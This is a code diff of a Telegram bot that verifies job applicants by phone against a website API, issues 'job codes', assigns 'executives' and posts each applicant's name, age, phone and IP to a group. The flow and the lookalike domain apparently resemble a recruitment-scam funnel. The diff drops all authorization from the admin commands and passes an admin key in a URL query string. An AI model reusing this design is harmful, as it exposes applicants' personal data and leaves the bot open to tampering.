@@ -1,9 +1,9 @@
-/* bot/index.ts
+/* botindex.ts
    HirePro Telegram bot (grammY + better-sqlite3)
-   Features:
-   - Round-robin executive assignment (/add, /remove, /status in supergroup)
-   - Validate user by phone_e164 saved from the website form
-   - One-time group post (Name, Age, Phone, IP, Code) — no header
+
+   - Commands: /start /help /share /info /status /add /remove
+   - Verifies applicant by phone saved from the website (via API)
+   - One-time group post per lead (tracked locally)
    - DM includes code + executive contact + "Message now" button
 */
 
@@ -11,294 +11,282 @@ import { Bot, Keyboard, InlineKeyboard } from "grammy";
 import type { Context } from "grammy";
 import Database from "better-sqlite3";
 
-// --------- Env ---------
+// ---------- ENV ----------
 const TOKEN = process.env.BOT_TOKEN!;
-const GROUP_ID = Number(process.env.GROUP_ID);
-const OWNER_ID = Number(process.env.OWNER_ID);
-const DB_PATH = process.env.DATABASE_PATH || process.env.DATABASE || "/tmp/app.db";
-const WEB_ORIGIN = process.env.WEB_ORIGIN || ""; // used only for help text link if you want
+const GROUP_ID = Number(process.env.GROUP_ID); // Telegram group/chat ID for ops posts
+const ADMIN_KEY = process.env.ADMIN_KEY || ""; // must match Vercel ADMIN_KEY (read-only lookup)
+const API_BASE = process.env.NEXT_PUBLIC_API_BASE || "https://www.hirepr0.com";
+if (!TOKEN) throw new Error("BOT_TOKEN env is missing");
+if (!GROUP_ID) throw new Error("GROUP_ID env is missing");
 
-if (!TOKEN || !GROUP_ID || !OWNER_ID) {
-  console.error("Missing env BOT_TOKEN, GROUP_ID, OWNER_ID");
-  process.exit(1);
-}
-
-// --------- DB setup ---------
-const db = new Database(DB_PATH);
+// ---------- DB (local file, only for execs + 'posted' flags) ----------
+const db = new Database("./execs.db");
 db.pragma("journal_mode = WAL");
 
-// Ensure tables/columns exist
 db.exec(`
 CREATE TABLE IF NOT EXISTS executives (
   id INTEGER PRIMARY KEY AUTOINCREMENT,
-  phone_e164 TEXT NOT NULL UNIQUE,
-  username   TEXT NOT NULL,
-  active     INTEGER NOT NULL DEFAULT 1,
-  assigned   INTEGER NOT NULL DEFAULT 0,
-  created_at TEXT DEFAULT (datetime('now')),
-  updated_at TEXT DEFAULT (datetime('now'))
+  username TEXT NOT NULL UNIQUE,
+  active INTEGER NOT NULL DEFAULT 1,
+  assigned INTEGER NOT NULL DEFAULT 0,
+  updated_at TEXT NOT NULL DEFAULT (datetime('now'))
+);
+CREATE TABLE IF NOT EXISTS posted_leads (
+  lead_id TEXT PRIMARY KEY, -- remote lead id string
+  posted_at TEXT NOT NULL DEFAULT (datetime('now'))
 );
 `);
 
-function columnExists(table: string, column: string) {
-  const rows = db.prepare(`PRAGMA table_info(${table})`).all() as any[];
-  return rows.some(r => r.name === column);
-}
-
-// The website wrote into "leads" table. Add columns if they don't exist.
-if (!columnExists("leads", "work_code")) {
-  try { db.exec(`ALTER TABLE leads ADD COLUMN work_code TEXT`); } catch {}
-}
-if (!columnExists("leads", "group_posted_at")) {
-  try { db.exec(`ALTER TABLE leads ADD COLUMN group_posted_at TEXT`); } catch {}
-}
-
-// --------- Helpers ---------
-const ok = (v: any) => v !== undefined && v !== null;
-const toPlus = (p: string) => p.startsWith("+") ? p : `+${p}`;
-
-// Same code generator we used for the site route
-function makeCode(len = 8) {
-  const alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
-  let s = "";
-  for (let i = 0; i < len; i++) s += alphabet[Math.floor(Math.random() * alphabet.length)];
-  return s;
-}
-
-type LeadRow = {
-  id: number;
-  name: string | null;
-  email: string | null;
-  phone_e164: string;
-  age: number | null;
-  gender: string | null;
-  note: string | null;
-  ip: string | null;
-  work_code: string | null;
-  group_posted_at: string | null;
-};
-
-function getLeadByPhone(phone_e164: string): LeadRow | undefined {
-  return db.prepare<LeadRow>(`SELECT * FROM leads WHERE phone_e164 = ?`).get(phone_e164) as any;
-}
-
-function ensureWorkCode(lead: LeadRow): string {
-  if (lead.work_code && lead.work_code.length >= 6) return lead.work_code;
-  const code = makeCode(8);
-  db.prepare(`UPDATE leads SET work_code = ? WHERE id = ?`).run(code, lead.id);
-  return code;
-}
-
-function markGroupPosted(leadId: number) {
-  db.prepare(`UPDATE leads SET group_posted_at = datetime('now') WHERE id = ?`).run(leadId);
-}
-
-function hasGroupPosted(lead: LeadRow) {
-  return ok(lead.group_posted_at);
-}
-
 type ExecRow = {
   id: number;
-  phone_e164: string;
   username: string;
   active: number;
   assigned: number;
   updated_at: string;
 };
 
-function upsertExecutive(phone_e164: string, username: string) {
-  const row = db.prepare<ExecRow>(`SELECT * FROM executives WHERE phone_e164 = ?`).get(phone_e164) as any;
-  if (row) {
-    db.prepare(`UPDATE executives SET username = ?, active = 1, updated_at = datetime('now') WHERE phone_e164 = ?`)
-      .run(username, phone_e164);
-  } else {
-    db.prepare(`INSERT INTO executives (phone_e164, username, active) VALUES (?, ?, 1)`).run(phone_e164, username);
+function addExec(username: string) {
+  const u = username.replace(/^@/, "");
+  db.prepare(
+    `INSERT OR IGNORE INTO executives (username, active, assigned) VALUES (?, 1, 0)`
+  ).run(u);
+}
+function removeExec(username: string) {
+  const u = username.replace(/^@/, "");
+  db.prepare(`DELETE FROM executives WHERE username = ?`).run(u);
+}
+function listExecs(): ExecRow[] {
+  return db.prepare(`SELECT * FROM executives ORDER BY active DESC, assigned ASC, updated_at ASC`).all() as ExecRow[];
+}
+function chooseExecutiveRR(): ExecRow | undefined {
+  const rows = listExecs().filter((r) => r.active);
+  return rows[0];
+}
+function bumpAssigned(id: number) {
+  db.prepare(`UPDATE executives SET assigned = assigned + 1, updated_at = datetime('now') WHERE id = ?`).run(id);
+}
+function markPostedOnce(leadId: string) {
+  db.prepare(`INSERT OR IGNORE INTO posted_leads (lead_id) VALUES (?)`).run(leadId);
+}
+function hasPosted(leadId: string) {
+  const row = db.prepare(`SELECT 1 FROM posted_leads WHERE lead_id = ?`).get(leadId) as any;
+  return !!row;
+}
+
+// ---------- Phone helpers ----------
+function normalizeE164Like(s?: string | null): string {
+  if (!s) return "";
+  // keep + if first, drop all non-digits elsewhere
+  const withPlus = s.trim().replace(/[^\d+]/g, "");
+  return withPlus.replace(/\+(?=.+\+)/g, "");
+}
+function last10Digits(s: string): string {
+  return (s || "").replace(/\D/g, "").slice(-10);
+}
+
+// ---------- Remote lead lookup (website API) ----------
+type LeadRow = {
+  id: number | string;
+  name?: string;
+  email?: string;
+  phone_e164?: string;
+  gender?: string;
+  age?: number;
+  work_code?: string;
+  created_at?: string;
+  ip?: string;
+};
+
+async function fetchLeadByE164(e164: string): Promise<LeadRow | null> {
+  try {
+    const u = new URL(`${API_BASE}/api/lead/lookup`);
+    u.searchParams.set("e164", e164);
+    u.searchParams.set("key", ADMIN_KEY);
+    const res = await fetch(u.toString(), { method: "GET" });
+    if (!res.ok) return null;
+    const json = (await res.json()) as any;
+    if (!json?.ok || !json?.row) return null;
+    return json.row as LeadRow;
+  } catch {
+    return null;
   }
 }
 
-function removeExecutive(phone_e164: string) {
-  db.prepare(`UPDATE executives SET active = 0, updated_at = datetime('now') WHERE phone_e164 = ?`).run(phone_e164);
-}
+// ---------- Bot ----------
+const bot = new Bot(TOKEN);
 
-function chooseExecutiveRR(): ExecRow | undefined {
-  // Lowest assigned first, then oldest updated -> fair round robin
-  const row = db.prepare<ExecRow>(`
-      SELECT * FROM executives
-      WHERE active = 1
-      ORDER BY assigned ASC, datetime(updated_at) ASC
-      LIMIT 1
-  `).get() as any;
-  return row;
-}
-
-function bumpAssigned(execId: number) {
-  db.prepare(`UPDATE executives SET assigned = assigned + 1, updated_at = datetime('now') WHERE id = ?`).run(execId);
-}
-
-// --------- Bot ---------
-const bot = new Bot<Context>(TOKEN);
-
-// --------- Middleware: restrict admin cmds ---------
-function isOwner(ctx: Context) {
-  return ctx.from && ctx.from.id === OWNER_ID;
-}
-
-// --------- User commands ---------
+// /start
 bot.command("start", async (ctx) => {
-  const kb = new Keyboard().requestContact("Click Accept Job Code.").oneTime().resized();
+  const kb = new Keyboard().requestContact("Click Accept Job Code.").resized();
   await ctx.reply(
-    `Hello ${ctx.from?.first_name ?? ""}!\n\n` +
-    `Use /info to view your account information\n` +
-    `Use /share to share your contact details\n` +
-    `Use /help to get instructions\n\n` +
-    `Please click the button below to share your contact information`,
+    `Hello ${ctx.from?.first_name || "there"}!\n\n` +
+      `Please click the button below to share your contact information.`,
     { reply_markup: kb }
   );
 });
 
+// /help
 bot.command("help", async (ctx) => {
   await ctx.reply(
-    `You need to enter the same mobile phone number as your Telegram number and submit it before you can get the job.\n\n` +
-    `• /share – share your Telegram contact\n` +
-    `• /info – show what we have for you`
+    `Use /info to view your account information\n` +
+      `Use /share to share your contact details\n` +
+      `Use /help to get instructions\n\n` +
+      `Please click the button below to share your contact information`
   );
 });
 
-bot.command("share", async (ctx) => {
-  const kb = new Keyboard().requestContact("Click Accept Job Code.").oneTime().resized();
-  await ctx.reply("Tap the button to send your Telegram phone number:", { reply_markup: kb });
-});
-
+// /info
 bot.command("info", async (ctx) => {
-  const uid = ctx.from?.id;
-  if (!uid) return;
-  // We don't store user ↔ lead binding. Show generic instructions.
   await ctx.reply(
-    `ID: ${uid}\n` +
-    `user name: ${ctx.from?.username ? "@" + ctx.from.username : "(none)"}\n` +
-    `full name: ${[ctx.from?.first_name, ctx.from?.last_name].filter(Boolean).join(" ") || "(none)"}\n\n` +
-    `phone: please use the /share command to share.`
+    `Your Telegram name: ${ctx.from?.first_name || ""} ${ctx.from?.last_name || ""}\n` +
+      `Username: ${ctx.from?.username ? "@" + ctx.from?.username : "(none)"}\n` +
+      `ID: ${ctx.from?.id}`
   );
 });
 
-// --------- Contact handler ---------
-bot.on(":contact", async (ctx) => {
-  const contact = ctx.message?.contact;
-  if (!contact) return;
-  const tgPhone = toPlus(contact.phone_number.replace(/\s+/g, ""));
-  // Lookup by E.164
-  const lead = getLeadByPhone(tgPhone);
-
-  if (!lead) {
-    await ctx.reply(
-      `Mobile phone number verification failed. It is different from the mobile phone number you submitted in the form.`
-    );
-    return;
-  }
-
-  const code = ensureWorkCode(lead);
-
-  // Pick an executive (round robin)
-  const exec = chooseExecutiveRR();
-  let execText = "";
-  let execBtn: InlineKeyboard | undefined = undefined;
-
-  if (exec) {
-    bumpAssigned(exec.id);
-    const at = exec.username.startsWith("@") ? exec.username : `@${exec.username}`;
-    execText = `executive contact: ${at}`;
-    execBtn = new InlineKeyboard().url("Message now", `https://t.me/${exec.username.replace(/^@/, "")}`);
-  } else {
-    execText = `executive contact: (waiting – no executive online)`;
-  }
-
-  // DM to user with code + exec contact + button
+// /share
+bot.command("share", async (ctx) => {
+  const kb = new Keyboard().requestContact("Share my contact 📱").resized();
   await ctx.reply(
-    `Your work code is used to verify your identity.\n` +
-    `Verify successfully!\n` +
-    `Job code: ${code}\n` +
-    `${execText}`,
-    execBtn ? { reply_markup: execBtn } : undefined
+    "Please share the phone number you use on Telegram (tap the button).",
+    { reply_markup: kb }
   );
-
-  // Post to group only once
-  if (!hasGroupPosted(lead)) {
-    const fullName = lead.name || [ctx.from?.first_name, ctx.from?.last_name].filter(Boolean).join(" ") || "(unknown)";
-    const age = ok(lead.age) ? lead.age : "-";
-    const ip = lead.ip || "-";
-
-    const text =
-      `Name: ${fullName}\n` +
-      `Age: ${age}\n` +
-      `Phone: ${lead.phone_e164}\n` +
-      `IP: ${ip}\n` +
-      `Code: ${code}`;
-
-    await ctx.api.sendMessage(GROUP_ID, text, {
-      // grammY doesn't have disable_web_page_preview; use link_preview_options
-      link_preview_options: { is_disabled: true },
-    });
-
-    markGroupPosted(lead.id);
-  }
 });
 
-// --------- Admin/group commands ---------
-// Only accept these in the supergroup, and only from OWNER_ID
-async function requireOwner(ctx: Context): Promise<boolean> {
-  if (ctx.chat?.id !== GROUP_ID) return false;
-  if (!isOwner(ctx)) return false;
-  return true;
-}
-
+// /status (list execs)
 bot.command("status", async (ctx) => {
-  if (ctx.chat?.id !== GROUP_ID) return; // status only in group
-  const rows = db.prepare<ExecRow>(`SELECT * FROM executives ORDER BY active DESC, assigned DESC`).all() as any[];
+  const rows = listExecs();
   if (!rows.length) {
-    await ctx.reply("No executive assignments yet.");
+    await ctx.reply("No executives configured.");
     return;
   }
-  const lines = rows.map(r =>
-    `• ${r.active ? "✅" : "❌"} ${r.phone_e164} — @${r.username} — assigned: ${r.assigned}`
-  ).join("\n");
-  await ctx.reply(lines);
-});
-
-bot.command("add", async (ctx) => {
-  if (!(await requireOwner(ctx))) return;
-  const text = ctx.message?.text || "";
-  const [, phoneRaw, unameRaw] = text.trim().split(/\s+/);
-  if (!phoneRaw || !unameRaw) {
-    await ctx.reply("Usage: /add <phone_e164> <username>");
-    return;
-  }
-  const phone = toPlus(phoneRaw);
-  const username = unameRaw.replace(/^@/, "");
-  upsertExecutive(phone, username);
-
-  await ctx.reply(
-    `Added/updated executive:\n` +
-    `• Phone: ${phone}\n` +
-    `• Username: @${username}\n` +
-    `• Active: Yes\n` +
-    `• Assigned: 0 ✅`
+  const lines = rows.map(
+    (r) => `${r.active ? "✅" : "❌"} @${r.username} — assigned: ${r.assigned}`
   );
+  await ctx.reply(lines.join("\n"));
 });
 
-bot.command("remove", async (ctx) => {
-  if (!(await requireOwner(ctx))) return;
-  const text = ctx.message?.text || "";
-  const [, phoneRaw] = text.trim().split(/\s+/);
-  if (!phoneRaw) {
-    await ctx.reply("Usage: /remove <phone_e164>");
+// /add @username
+bot.command("add", async (ctx) => {
+  const m = ctx.match as unknown as string;
+  const username = (m || ctx.message?.text || "").split(/\s+/)[1];
+  if (!username) {
+    await ctx.reply("Usage: /add @username");
     return;
   }
-  const phone = toPlus(phoneRaw);
-  removeExecutive(phone);
-  await ctx.reply(`Removed mapping for ${phone}`);
+  addExec(username);
+  await ctx.reply(`Added executive: ${username}`);
 });
 
-// --------- Startup ---------
+// /remove @username
+bot.command("remove", async (ctx) => {
+  const m = ctx.match as unknown as string;
+  const username = (m || ctx.message?.text || "").split(/\s+/)[1];
+  if (!username) {
+    await ctx.reply("Usage: /remove @username");
+    return;
+  }
+  removeExec(username);
+  await ctx.reply(`Removed mapping for ${username}`);
+});
+
+// --------- Contact handler (verification + code DM) ---------
+bot.on("contact", async (ctx) => {
+  try {
+    const contact = (ctx.message as any)?.contact;
+    if (!contact?.phone_number) {
+      await ctx.reply("I couldn't read your phone number. Please try /share again.");
+      return;
+    }
+
+    // Normalize Telegram number
+    const tgE164ish = normalizeE164Like(contact.phone_number);
+    const tgLast10 = last10Digits(tgE164ish);
+
+    // 1) Try exact lookup with +countrycode
+    let lead: LeadRow | null = tgE164ish.startsWith("+")
+      ? await fetchLeadByE164(tgE164ish)
+      : null;
+
+    // 2) Fallbacks (India +91 + last10)
+    if (!lead && tgLast10.length === 10) {
+      lead = await fetchLeadByE164("+91" + tgLast10);
+    }
+
+    if (!lead) {
+      await ctx.reply(
+        "I can't find your application.\n" +
+          "Please ensure you submitted the form on https://www.hirepr0.com/ with the SAME phone number used on Telegram,\n" +
+          "then try /share again."
+      );
+      return;
+    }
+
+    // Compare by last 10 digits so formats don't matter
+    const dbLast10 = last10Digits(lead.phone_e164 || "");
+    if (!dbLast10 || dbLast10 !== tgLast10) {
+      await ctx.reply(
+        "Mobile phone number verification failed. It is different from the mobile phone number you submitted in the form."
+      );
+      return;
+    }
+
+    // Ensure code from server (already generated on insert)
+    const code = lead.work_code || "(no code yet)";
+
+    // Choose executive (round robin) from local execs db
+    const exec = chooseExecutiveRR();
+    let execText = "";
+    let execBtn: InlineKeyboard | undefined;
+
+    if (exec) {
+      bumpAssigned(exec.id);
+      const handle = exec.username.startsWith("@") ? exec.username : `@${exec.username}`;
+      execText = `executive contact: ${handle}`;
+      execBtn = new InlineKeyboard().url(
+        "Message now",
+        `https://t.me/${exec.username.replace(/^@/, "")}`
+      );
+    } else {
+      execText = "executive contact: (waiting – no executive online)";
+    }
+
+    // DM the user (keep copy the same as your previous bot)
+    await ctx.reply(
+      `Your work code is used to verify your identity.\n` +
+        `Verify successfully!\n` +
+        `Job code: ${code}\n` +
+        `${execText}`,
+      execBtn ? { reply_markup: execBtn } : undefined
+    );
+
+    // Post to ops group once per lead
+    const leadKey = String(lead.id);
+    if (!hasPosted(leadKey)) {
+      const name =
+        lead.name ||
+        [ctx.from?.first_name, ctx.from?.last_name].filter(Boolean).join(" ") ||
+        "(unknown)";
+      const age = lead.age ?? "-";
+      const ip = lead.ip || "-";
+      const text =
+        `Name: ${name}\n` +
+        `Age: ${age}\n` +
+        `Phone: ${lead.phone_e164}\n` +
+        `IP: ${ip}\n` +
+        `Code: ${code}`;
+      await bot.api.sendMessage(GROUP_ID, text, {
+        link_preview_options: { is_disabled: true },
+      });
+      markPostedOnce(leadKey);
+    }
+  } catch (err) {
+    console.error("contact handler error:", err);
+    await ctx.reply("Sorry, something went wrong. Please try again in a moment.");
+  }
+});
+
+// ---------- Startup ----------
 bot.catch((err) => {
   console.error("Bot error:", err);
 });
